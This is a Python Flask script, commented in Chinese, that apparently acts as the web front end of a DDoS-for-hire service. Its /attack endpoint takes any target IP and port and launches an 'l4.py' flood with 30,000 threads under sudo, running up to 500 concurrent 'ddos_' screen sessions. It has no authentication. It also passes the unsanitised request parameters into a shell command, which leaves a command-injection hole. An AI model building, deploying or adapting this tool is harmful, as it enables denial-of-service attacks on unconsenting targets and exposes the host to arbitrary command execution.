from flask import Flask, request
import os
import random
import string
import subprocess

app = Flask(__name__)

MAX_SCREEN_SESSIONS = 500  # 最大允许的screen会话数

# 生成随机字符串
def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# 获取当前screen会话数量
def get_screen_session_count():
    try:
        output = subprocess.check_output('screen -ls', shell=True).decode('utf-8')
        # 过滤出包含 'ddos_' 的会话，统计数量
        return output.count('ddos_')
    except Exception:
        return 0

# 处理攻击请求，使用python3 l4.py执行
@app.route('/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    
    if not ip or not port:
        return "IP or Port not provided", 400

    # 检查当前的screen会话数量
    current_screen_count = get_screen_session_count()
    if current_screen_count >= MAX_SCREEN_SESSIONS:
        return f"Maximum number of {MAX_SCREEN_SESSIONS} active screen sessions reached. Try again later.", 429

    session_name = f"ddos_{generate_random_string()}"
    
    # 构建命令，使用screen来执行python3 l4.py，并自动关闭screen，首先设置ulimit -n为100000
    command = (
        f"screen -S {session_name} -dm bash -c "
        f"'ulimit -n 100000; sudo timeout 300s python3 l4.py {ip}:{port} --threads 30000 --duration 300; "
        f"screen -S {session_name} -X quit'"
    )
    
    try:
        # 执行命令
        subprocess.Popen(command, shell=True)
        return f"Started L4 attack on {ip}:{port} with session {session_name}", 200
    except Exception as e:
        return f"Error: {str(e)}", 500

# 查看所有screen任务
@app.route('/list')
def list_tasks():
    try:
        # 列出所有的screen session
        output = subprocess.check_output('screen -ls', shell=True).decode('utf-8')
        return f"<pre>{output}</pre>", 200
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
